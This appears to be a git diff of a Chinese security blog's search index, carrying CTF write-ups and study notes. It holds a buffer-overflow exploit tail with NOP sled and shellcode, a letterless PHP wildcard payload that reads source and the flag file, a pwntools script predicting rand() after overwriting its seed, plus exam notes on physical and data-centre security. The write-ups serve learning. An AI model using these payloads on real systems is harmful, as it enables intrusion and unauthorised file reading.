class="line"></span><br><span class="line"><span class="comment"># buf = Junk + RA + NOP&#x27;s + Shellcode</span></span><br><span class="line">buf = <span class="string">&quot;A&quot;</span> * <span class="number">268</span></span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += <span class="string">&quot;\x90&quot;</span> * <span class="number">100</span></span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Calling vulnerable program&quot;</span></span><br><span class="line">call([<span class="string">&quot;./vuln&quot;</span>, buf])</span><br></pre></td></tr></table></figure>
-<h1 id="英文原文"><a href="#英文原文" class="headerlink" title="英文原文"></a>英文原文</h1><p><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/">Classic Stack Based Buffer Overflow</a></p>
+<p>可以使用?来代替字符：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;??? &#x3D;&gt; &#x2F;bin&#x2F;cat</span><br></pre></td></tr></table></figure><br>用此来读取源码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;?????.???&#96;;?&gt;&lt;?&#x3D;$_?&gt;</span><br><span class="line">&quot;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;</span><br></pre></td></tr></table></figure><br>为保持长度小于35且不存在$_,则将$_带入后面一个表达式，同时使用*来匹配最后文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;???&#x2F;???&#x2F;????&#x2F;*&#96;?&gt;</span><br></pre></td></tr></table></figure><br>php使用短链接，其含义如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &#96;&#x2F;bin&#x2F;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#96;?&gt;</span><br></pre></td></tr></table></figure><br>读取到源码发现存在如下函数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getFlag()&#123;</span><br><span class="line">	$flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>最后直接读取flag文件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;;?&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x04-其它思考"><a href="#0x04-其它思考" class="headerlink" title="0x04 其它思考"></a>0x04 其它思考</h2><p>windows中将if(preg_match(“/[A-Za-z0-9_$]+/“,$code))过滤修改，去除对大写字母或小写的过滤，由于windows对大小写不敏感，可以在windows系统中尝试执行任意代码<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows执行任意代码.PNG" alt></p>
+<p>不对if(preg_match(“/[A-Za-z0-9_$]+/“,$code))进行修改，将whoami进行取反再url编码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~%88%97%90%9E%92%96</span><br></pre></td></tr></table></figure><br>则失败。<br><img src="/2018/10/11/CTF%E4%B8%80%E9%81%93web%E9%A2%98%E5%B0%8F%E7%BB%93-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DgetFlag/windows绕过失败.PNG" alt></p>
+<p>去除[A-Za-z0-9_$]同样也无法执行代码，可见在windows中对命令进行位运算后会执行失败。</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://xz.aliyun.com/t/2597#toc-8">[红日安全]PHP-Audit-Labs题解之Day5-8</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a><br><a href="https://www.anquanke.com/post/id/154284">CTF题目思考—极限利用</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -820,39 +820,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PWN中伪随机数问题--srand()/rand()</title>
-    <url>/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/</url>
-    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p>
-<a id="more"></a>
-<h1 id="0x01-关于rand-和sand"><a href="#0x01-关于rand-和sand" class="headerlink" title="0x01 关于rand()和sand()"></a>0x01 关于rand()和sand()</h1><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>rand()函数是使用线性同余法生成随机数，因为其周期特别长，所以在一定范围内可以看成随机的。但每次生成都是固定的序列</p>
-<p>我们使用如下代码生成10个随机数：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>此时查看运行结果，多次运行结果一样。</p>
-<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/rand运行.png" style="zoom:50%;"></p>
-<h2 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h2><p>srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用时间time(NULL)或time(0)作为seed。当我们不设置srand()时，将默认为srand(1)。如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。如下代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		srand(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>结果如图：</p>
-<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/srand为2.png" style="zoom:50%;"></p>
-<h1 id="0x02-简单示例"><a href="#0x02-简单示例" class="headerlink" title="0x02 简单示例"></a>0x02 简单示例</h1><p><strong>攻防世界—dice_game</strong></p>
-<p>我们直接拖入ida看源码</p>
-<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/dice-game.png" style="zoom:80%;"></p>
-<p>由于我们可以覆盖seed，所以再输入payload时，将seed设置为1.</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p>此时，我们就直接使用给出的libc来自动计算随机数</p>
-<p>python脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p = remote(IP，port)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">64</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome, let me know your name: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    payload = str(libc.rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Give me the point(1~6): &#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><strong>ctypes包的cdll.LoadLibrary(‘libc.so.xxx’)可以在在脚本中加载动态库，同时又能调用库中的函数。</strong></p>
-<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://blog.csdn.net/u013745804/article/details/82379266">关于rand()和srand()</a></p>
-<p><a href="https://blog.csdn.net/weixin_39194641/article/details/103089862">CTF中的PWN——srand()/rand()漏洞（栈溢出）</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PWN中格式化字符串漏洞</title>
     <url>/2020/09/03/PWN%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>哈哈哈，太懒了，时隔一年半又来更新博客了。</p>
@@ -925,6 +892,39 @@
 <p>某些题目需要将其先泄漏出来，再填充到结束的位置</p>
 <h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="http://drops.xmd5.com/static/drops/papers-9426.html">漏洞挖掘基础之格式化字符串</a></p>
 <p><a href="https://kevien.github.io/2018/04/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">格式化字符串漏洞</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PWN中伪随机数问题--srand()/rand()</title>
+    <url>/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/</url>
+    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p>
+<a id="more"></a>
+<h1 id="0x01-关于rand-和sand"><a href="#0x01-关于rand-和sand" class="headerlink" title="0x01 关于rand()和sand()"></a>0x01 关于rand()和sand()</h1><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>rand()函数是使用线性同余法生成随机数，因为其周期特别长，所以在一定范围内可以看成随机的。但每次生成都是固定的序列</p>
+<p>我们使用如下代码生成10个随机数：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时查看运行结果，多次运行结果一样。</p>
+<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/rand运行.png" style="zoom:50%;"></p>
+<h2 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h2><p>srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用时间time(NULL)或time(0)作为seed。当我们不设置srand()时，将默认为srand(1)。如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。如下代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		srand(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果如图：</p>
+<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/srand为2.png" style="zoom:50%;"></p>
+<h1 id="0x02-简单示例"><a href="#0x02-简单示例" class="headerlink" title="0x02 简单示例"></a>0x02 简单示例</h1><p><strong>攻防世界—dice_game</strong></p>
+<p>我们直接拖入ida看源码</p>
+<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/dice-game.png" style="zoom:80%;"></p>
+<p>由于我们可以覆盖seed，所以再输入payload时，将seed设置为1.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>此时，我们就直接使用给出的libc来自动计算随机数</p>
+<p>python脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p = remote(IP，port)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">64</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome, let me know your name: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    payload = str(libc.rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Give me the point(1~6): &#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>ctypes包的cdll.LoadLibrary(‘libc.so.xxx’)可以在在脚本中加载动态库，同时又能调用库中的函数。</strong></p>
+<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://blog.csdn.net/u013745804/article/details/82379266">关于rand()和srand()</a></p>
+<p><a href="https://blog.csdn.net/weixin_39194641/article/details/103089862">CTF中的PWN——srand()/rand()漏洞（栈溢出）</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -1303,6 +1303,172 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
       </tags>
   </entry>
   <entry>
+    <title>第5章 物理环境安全技术</title>
+    <url>/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h1 id="物理安全概念与要求"><a href="#物理安全概念与要求" class="headerlink" title="物理安全概念与要求"></a>物理安全概念与要求</h1><h2 id="物理安全威胁"><a href="#物理安全威胁" class="headerlink" title="物理安全威胁"></a>物理安全威胁</h2><p>常见威胁：</p>
+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/物理安全威胁.jpg" alt></p>
+<a id="more"></a>
+<p>攻击技术：硬件木马、硬件协同的恶意代码、硬件安全漏洞利用、基于软件漏洞攻击硬件实体、基于环境攻击计算机实体。</p>
+<h2 id="物理安全保护"><a href="#物理安全保护" class="headerlink" title="物理安全保护"></a>物理安全保护</h2><ol>
+<li>设备物理安全：有标志和标记、防止电磁信息泄露、抗电磁干扰、安全漏洞等</li>
+<li>环境物理安全：机房选择、防护</li>
+<li>系统物理安全：存储介质，灾备、访问保护</li>
+</ol>
+<p>方法：安全合规、访问控制、安全屏蔽、故障容错、安全监测与预警、供应链安全管理和容灾备份等。</p>
+<h2 id="物理安全规范"><a href="#物理安全规范" class="headerlink" title="物理安全规范"></a>物理安全规范</h2><p>《信息系统物理安全技术要求（GB/T 21052-2007）》分4级保护：</p>
+<ol>
+<li>第一级用户自主保护级提供基本的物理安全保护</li>
+<li>第二级系统审计保护级提供适当的物理安全保护</li>
+<li>第三级安全标记保护级提供较高程度的物理安全保护</li>
+<li>第四级结构化保护级提供更高程度的物理安全保护</li>
+</ol>
+<h1 id="物理环境安全分析与防护"><a href="#物理环境安全分析与防护" class="headerlink" title="物理环境安全分析与防护"></a>物理环境安全分析与防护</h1><ol>
+<li><p><strong> 防火</strong></p>
+<p>理想灭火材料：卤代烷1211和1301灭火剂</p>
+</li>
+<li><p><strong>防水</strong></p>
+<p>不要把机房设置在楼房底层或地下室</p>
+</li>
+<li><p><strong>防震</strong></p>
+</li>
+<li><p><strong>防盗</strong></p>
+<p>报警器和监控、物理访问控制</p>
+</li>
+<li><p><strong>防鼠虫害</strong></p>
+<p>危害：咬坏电缆或引起电源短路</p>
+</li>
+<li><p><strong>防雷</strong></p>
+<p>避雷针及专用防雷设施，设备接地</p>
+</li>
+<li><p><strong>防电磁</strong></p>
+<p>防止电磁干扰，防止信息通过电磁泄漏。措施：接地、屏蔽、选择合适场地</p>
+</li>
+<li><p><strong>防静电</strong></p>
+<p>人员服装、机房温湿度、材料、操作戴防静电手套</p>
+</li>
+<li><p><strong>安全供电</strong></p>
+<p>专用电线路、不间断电源（UPS）、备用发电机</p>
+</li>
+</ol>
+<h1 id="机房安全分析与防护"><a href="#机房安全分析与防护" class="headerlink" title="机房安全分析与防护"></a>机房安全分析与防护</h1><h2 id="机房功能区域组成"><a href="#机房功能区域组成" class="headerlink" title="机房功能区域组成"></a>机房功能区域组成</h2><p>《计算机场地通用规范（GB/T 2887-2011）》（允许一室多用或酌情增减）：</p>
+<ol>
+<li>主要工作房间：主机房、终端室等；</li>
+<li>第一类辅助房间：低压配电间、不间断电源室、空调机室、发电机室、气体钢瓶室、监控室等</li>
+<li>第二类辅助房间：资料室、维修室、技术人员办公室</li>
+<li>第三类辅助房间：储藏室、缓冲间、技术人员休息室、盥洗室</li>
+</ol>
+<h2 id="机房安全等级划分"><a href="#机房安全等级划分" class="headerlink" title="机房安全等级划分"></a>机房安全等级划分</h2><p>《计算机场地通用规范（GB/T 2887-2011）》分为A、B、C三级：</p>
+<ul>
+<li>A：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成严重损害</li>
+<li>B：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成较大损害的</li>
+<li>C：不属于A、B级的情况</li>
+</ul>
+<p>安全级别要求：</p>
+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-1.jpg" alt></p>
+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-2.jpg" alt></p>
+<h2 id="机房场地选择要求"><a href="#机房场地选择要求" class="headerlink" title="机房场地选择要求"></a>机房场地选择要求</h2><ol>
+<li><p>环境安全性</p>
+<p>避开：危险来源区、环境污染区、盐雾区、落雷区</p>
+</li>
+<li><p>地质可靠性</p>
+<p>避开：杂填土、地层断裂、地质不牢靠、有开采价值矿区、低洼、潮湿</p>
+</li>
+<li><p>场地抗电磁干扰性</p>
+<p>避开：无线电干扰源和微波线路的强电磁场干扰场所（不大于800A/m，100e）、强电流冲击</p>
+</li>
+<li><p>应避开强振动源和强噪音源</p>
+<p>避开：振动源、机场、主要道路</p>
+</li>
+<li><p>应避免设在建筑物的高层以及用水设备的下层或隔壁</p>
+</li>
+</ol>
+<h2 id="数据中心建设与设计要求"><a href="#数据中心建设与设计要求" class="headerlink" title="数据中心建设与设计要求"></a>数据中心建设与设计要求</h2><ul>
+<li>超大型数据中心：&gt;=10000个标准机架；重点考虑气候环境、能源供给，优先在气候寒冷、能源充足的一类或气候适宜，能源充足的二类地区。</li>
+<li>大型数据中心：&gt;=3000，&lt;10000标准机架；重点考虑气候环境、能源供给，优先在一类二类地区，也可在气候适宜，靠近能源富集地的三类地区</li>
+<li>中小型数据中心：&lt;3000标准机架；重点考虑市场需求、能源供给，在靠近用户所在地、能源获取便利的地区建设。</li>
+</ul>
+<p>《设计规范》（2018.1.1）将数据中心分为A、B、C三级，强制性条文简述：</p>
+<ul>
+<li>所有设备的金属外壳、各类金属管道、金属线槽、建筑物金属结构必须进行等电位联结并接地（8.4.4）</li>
+<li>耐火等级不应低于二级（13.2.1）</li>
+<li>与气体供能用房在统一建筑内时，两者之间采用耐火极限不低于2.0h的防火隔墙和1.5h的楼板，隔墙上开门采用甲级防火门（13.2.4）</li>
+<li>采用管网式气体或细水雾灭火系统的主机房，应同时设置两组独立的火灾探测器，火灾报警系统英语灭火系统和视频监控系统联动（13.3.1）</li>
+<li>设置气体灭火系统的主机房，应配置专用空气呼吸器或氧气呼吸器（13.4.1）</li>
+</ul>
+<h2 id="互联网数据中心"><a href="#互联网数据中心" class="headerlink" title="互联网数据中心"></a>互联网数据中心</h2><p>IDC六大逻辑组成部分：</p>
+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/IDC逻辑组成.jpg" alt></p>
+<p>《互联网数据中心工程技术规范（GB 51195-2016）》（2017.4.1）划分为R1（可用性不小于99.5%），R2（不小于99.9%），R3（不小于99.99%）3个级别，强制性条文简述：</p>
+<ul>
+<li>抗震设防烈度7度以上（含7度）地区，主要电信设备必须经过性能检测合格</li>
+<li>对肌肤安全条件进行全面检查：灭火器材，非燃材料，不同电压的电源设备、电源插座应有明显区别标志。</li>
+</ul>
+<h2 id="CA机房物理安全控制"><a href="#CA机房物理安全控制" class="headerlink" title="CA机房物理安全控制"></a>CA机房物理安全控制</h2><p>《电子政务电子认证服务业务规则规范》，提出规范性要求。</p>
+<ol>
+<li>物理环境按照GM/T 0034要求严格实施，至少每五年进行一次屏蔽室检测</li>
+<li>所有人员应佩戴标识身份的证明</li>
+<li>进出人员留有记录，并妥善、安全的保管。（监控录像、门禁记录）</li>
+<li>建立并执行人员访问制度及程序，对访问人员进行监督和监控</li>
+<li>保护设备免于电源故障或网络通信异常影响</li>
+<li>处理或再利用存储介质，检查是否含有敏感数据，并物理销毁或安全覆盖</li>
+<li>制定相关安全检查、监督策略。</li>
+</ol>
+<h1 id="网络通信线路安全分析与防护"><a href="#网络通信线路安全分析与防护" class="headerlink" title="网络通信线路安全分析与防护"></a>网络通信线路安全分析与防护</h1><h2 id="网络通信线路安全分析"><a href="#网络通信线路安全分析" class="headerlink" title="网络通信线路安全分析"></a>网络通信线路安全分析</h2><p>威胁：</p>
+<ul>
+<li>网络通信线路被切断</li>
+<li>网络通信线路被电磁干扰</li>
+<li>网络通信线路泄漏信息</li>
+</ul>
+<h2 id="网络通信线路安全防护"><a href="#网络通信线路安全防护" class="headerlink" title="网络通信线路安全防护"></a>网络通信线路安全防护</h2><p>两个方面：</p>
+<ul>
+<li>网络通信设备：采取设备冗余</li>
+<li>网络通信线路：采取多路通信</li>
+</ul>
+<h1 id="设备安全分析与防护"><a href="#设备安全分析与防护" class="headerlink" title="设备安全分析与防护"></a>设备安全分析与防护</h1><h2 id="设备实体安全分析"><a href="#设备实体安全分析" class="headerlink" title="设备实体安全分析"></a>设备实体安全分析</h2><ol>
+<li>设备实体环境关联安全威胁</li>
+<li>设备实体被盗取或损害</li>
+<li>设备实体受到电磁干扰</li>
+<li>设备供应链条中断或延缓</li>
+<li>设备实体的固件部分遭受攻击</li>
+<li>设备遭受硬件攻击</li>
+<li>设备实体的控制组件安全威胁</li>
+<li>设备非法外联</li>
+</ol>
+<h2 id="设备实体安全防护"><a href="#设备实体安全防护" class="headerlink" title="设备实体安全防护"></a>设备实体安全防护</h2><p>GB/T 21052-2007，主要技术措施：</p>
+<ol>
+<li>设备的标志和标记</li>
+<li>设备电磁辐射防护</li>
+<li>设备静电及用电安全防护</li>
+<li>设备磁场抗扰</li>
+<li>设备环境安全保护</li>
+<li>设备适应性与可靠性保护（包括：温度、湿度、冲击和碰撞适应性、可靠性、供应链弹性、安全质量保障、安全合规、安全审查）</li>
+</ol>
+<h2 id="设备硬件攻击防护"><a href="#设备硬件攻击防护" class="headerlink" title="设备硬件攻击防护"></a>设备硬件攻击防护</h2><p>主要措施：</p>
+<ol>
+<li>硬剑木马检测（方法：反向分析法、功耗分析法、侧信道分析法）</li>
+<li>硬件漏洞处理</li>
+</ol>
+<h1 id="存储介质安全分析与防护"><a href="#存储介质安全分析与防护" class="headerlink" title="存储介质安全分析与防护"></a>存储介质安全分析与防护</h1><h2 id="存储介质安全分析"><a href="#存储介质安全分析" class="headerlink" title="存储介质安全分析"></a>存储介质安全分析</h2><p>安全威胁：</p>
+<ol>
+<li>存储管理失效</li>
+<li>存储数据泄密</li>
+<li>存储介质及存储设备故障</li>
+<li>存储介质数据非安全删除</li>
+<li>恶意代码攻击</li>
+</ol>
+<h2 id="存储介质安全防护"><a href="#存储介质安全防护" class="headerlink" title="存储介质安全防护"></a>存储介质安全防护</h2><ol>
+<li>强化存储安全管理（专人负责，审批登记、备份、密封、消除数据）</li>
+<li>数据存储加密保存</li>
+<li>容错容灾存储技术（磁盘阵列、双机在线备份、离线备份）</li>
+</ol>
+]]></content>
+      <categories>
+        <category>信息安全工程师软考</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第4章 网络安全体系与网络安全模型</title>
     <url>/2020/09/16/%E7%AC%AC4%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/</url>
     <content><![CDATA[<h1 id="网络安全体系概述"><a href="#网络安全体系概述" class="headerlink" title="网络安全体系概述"></a>网络安全体系概述</h1><h2 id="网络安全体系概念"><a href="#网络安全体系概念" class="headerlink" title="网络安全体系概念"></a>网络安全体系概念</h2><p>体系包括：法律法规政策文件、安全策略、组织管理、技术措施、标准规范、安全建设与运营、人员队伍、教育培训、产业生态、安全投入等。</p>
@@ -1521,163 +1687,88 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
       </tags>
